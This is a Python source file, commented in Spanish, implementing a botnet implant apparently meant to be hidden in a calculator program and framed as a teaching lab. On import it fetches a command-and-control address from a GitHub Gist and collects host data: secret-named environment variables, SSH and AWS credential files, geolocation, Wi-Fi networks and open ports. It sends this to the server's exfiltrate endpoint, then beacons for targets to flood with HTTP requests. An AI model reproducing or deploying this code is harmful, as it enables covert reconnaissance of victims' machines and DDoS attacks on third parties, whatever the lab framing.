import os
import sys
import json
import socket
import urllib.request
import threading
import time
import platform
import subprocess
from pathlib import Path

# URL RAW del Gist de GitHub que actúa como Proxy de C2
GIST_URL = "https://gist.githubusercontent.com/tu_usuario/tu_gist_id/raw/c2_config.txt"

TARGET_URL = None
ATTACKING = False

def _get_c2_url():
    """Obtiene dinámicamente la IP de tu laptop desde GitHub Gist."""
    if "tu_usuario" in GIST_URL:
        return "http://localhost:5000"
        
    try:
        with urllib.request.urlopen(GIST_URL, timeout=4) as response:
            c2_address = response.read().decode('utf-8').strip()
            return f"http://{c2_address}"
    except Exception:
        return "http://localhost:5000"

C2_URL = _get_c2_url()

# =====================================================================
#                 FUNCIONES DE EXTRACCIÓN DE INTELIGENCIA
# =====================================================================

def get_environment_variables():
    """Obtiene las variables de entorno con nombres sensibles."""
    env_secrets = {}
    keywords = ['api', 'token', 'key', 'secret', 'password', 'passwd', 'aws', 'auth', 'ssh']
    for k, v in os.environ.items():
        if any(kw in k.lower() for kw in keywords):
            # Registramos solo la longitud para no comprometer datos reales en el lab
            env_secrets[k] = f"[{len(v)} chars]"
    return env_secrets

def get_sensitive_files():
    """Detecta la existencia de archivos de configuración y credenciales clave."""
    home = Path.home()
    sensitive_targets = {
        '.ssh/id_rsa':          'SSH Private Key (RSA)',
        '.ssh/known_hosts':     'SSH Known Hosts',
        '.aws/credentials':     'AWS Credentials',
        '.env':                 '.env File',
        '.gitconfig':           'Git Config',
    }
    return [label for path, label in sensitive_targets.items() if (home / path).exists()]

def get_geolocation():
    """Obtiene datos aproximados de ubicación del host mediante una API pública ip-api."""
    try:
        # Usamos un servicio HTTP público para no depender de librerías locales
        with urllib.request.urlopen("http://ip-api.com/json/?fields=status,country,city,isp", timeout=3) as res:
            return json.loads(res.read().decode('utf-8'))
    except:
        return {"status": "fail", "reason": "No internet mapping"}

def get_wifi_passwords():
    """Simula o recupera SSIDs conocidos del gestor de red de Linux (NetworkManager/iwd)."""
    networks = []
    try:
        # En sistemas basados en Arch/CachyOS se suele usar nmcli
        if os.path.exists("/usr/bin/nmcli"):
            out = subprocess.check_output(["nmcli", "-t", "-f", "SSID", "dev", "wifi"], text=True)
            networks = list(set([line.strip() for line in out.split('\n') if line.strip()]))[:5]
    except:
        pass
    return networks if networks else ["No WiFi interfaces detected / Permission Denied"]

def get_open_ports():
    """Escanea rápidamente puertos locales estándar para identificar servicios corriendo."""
    open_ports = []
    ports_to_test = [22, 80, 443, 3306, 5432, 8080, 8443, 
                     3000, 3001, 3002, 3003, 5173, 5174, 
                     30000, 9999, 9800, 5000, 5001, 5002,
                     5003, 5004, 5005, 5006, 5007, 5008, 
                     5009, 5010, 6000, 6001, 6002,
                     6003, 6004, 6005, 6006, 6007, 6008, 
                     6009, 6010, 7000, 7001, 7002,
                     7003, 7004, 7005, 7006, 7007, 7008, 
                     7009, 7010]
    for port in ports_to_test:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.05)
            if s.connect_ex(('127.0.0.1', port)) == 0:
                open_ports.append(port)
    return open_ports

def get_network_config():
    """Obtiene interfaces activas de red interna."""
    interfaces = {}
    try:
        # Obtención multiplataforma básica de hostname e IP interna
        hostname = socket.gethostname()
        interfaces[hostname] = socket.gethostbyname(hostname)
    except:
        pass
    return interfaces

def get_network_traffic():
    """Mapea conexiones activas (sockets abiertos en el sistema operativo)."""
    try:
        # En Linux podemos leer de forma nativa /proc/net/tcp para no usar comandos bloqueantes
        if os.path.exists("/proc/net/tcp"):
            with open("/proc/net/tcp", "r") as f:
                connections = len(f.readlines()) - 1
            return f"{connections} active TCP sockets in /proc/net/tcp"
    except:
        pass
    return "Unable to parse connection metrics"

def get_installed_packages():
    """Mapea paquetes instalados dentro del ecosistema de Python actual."""
    try:
        # Ejecuta un listado rápido de lo que tiene el entorno actual cargado
        return [p for p in sys.modules.keys() if not p.startswith('_')][:15]
    except:
        return []

def get_system_information():
    """Recopila la arquitectura de hardware, sistema operativo y procesador."""
    try:
        proc_count = len([p for p in os.listdir('/proc') if p.isdigit()]) if os.path.exists('/proc') else -1
    except:
        proc_count = -1

    return {
        "platform": platform.system(),
        "release": platform.release(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "active_processes": proc_count
    }

# =====================================================================
#                        ORQUESTACIÓN CENTRAL
# =====================================================================

def _collect_intel():
    """Reúne todas las llamadas modulares en un único reporte estructurado."""
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
    except:
        hostname, username = "unknown_host", "unknown_user"

    return {
        "bot_id":                 f"{hostname}_{username}",
        "user":                   username,
        "hostname":               hostname,
        "os":                     os.name,
        "python_version":         sys.version.split()[0],
        "system_info":            get_system_information(),
        "sensitive_files_found":  get_sensitive_files(),
        "env_secrets_detected":   get_environment_variables(),
        "geolocation":            get_geolocation(),
        "wifi_ssids":             get_wifi_passwords(),
        "local_open_ports":       get_open_ports(),
        "network_config":         get_network_config(),
        "network_traffic":        get_network_traffic(),
        "python_modules_loaded":  get_installed_packages()
    }

def exfiltrate_intel():
    """Exfiltra la información completa recopilada al servidor del atacante."""
    intel = _collect_intel()
    try:
        req = urllib.request.Request(
            f"{C2_URL}/exfiltrate",
            data=json.dumps(intel).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        # Disparo en un hilo daemon para no congelar la calculadora de la víctima
        threading.Thread(target=urllib.request.urlopen, args=(req,), kwargs={'timeout': 4}, daemon=True).start()
    except:
        pass
    return intel

# =====================================================================
#                       CICLO DE VIDA DE LA BOTNET
# =====================================================================

def _attack_loop():
    """Bucle persistente de inundación HTTP (Simulación de DDoS controlado)."""
    global ATTACKING, TARGET_URL
    while ATTACKING and TARGET_URL:
        try:
            # Peticiones ligeras con un timeout agresivo para no congelar la máquina del alumno
            urllib.request.urlopen(TARGET_URL, timeout=0.5)
        except:
            pass
        time.sleep(0.1)

def _heartbeat_loop():
    """Baliza constante (Beacon) que reporta estatus y descarga órdenes (C2)."""
    global TARGET_URL, ATTACKING
    try:
        bot_id = f"{socket.gethostname()}_{os.getlogin()}"
    except:
        bot_id = "generic_bot"

    while True:
        try:
            data = {"bot_id": bot_id, "status": "ALIVE"}
            req = urllib.request.Request(
                f"{C2_URL}/heartbeat",
                data=json.dumps(data).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=4) as response:
                command = json.loads(response.read().decode('utf-8'))
                new_target = command.get("target")
                
                # Máquina de estados para controlar la Botnet
                if new_target and not ATTACKING:
                    TARGET_URL = new_target
                    ATTACKING = True
                    threading.Thread(target=_attack_loop, daemon=True).start()
                elif not new_target:
                    ATTACKING = False
                    TARGET_URL = None
        except:
            pass
        time.sleep(10)

# =====================================================================
#                         DISPARADORES AUTOMÁTICOS
# =====================================================================
try:
    # 1. Se ejecuta el envío del reporte integral de datos del sistema
    exfiltrate_intel()
    
    # 2. Se levanta el hilo secundario persistente para recibir instrucciones distribuidas
    threading.Thread(target=_heartbeat_loop, daemon=True).start()
except:
    pass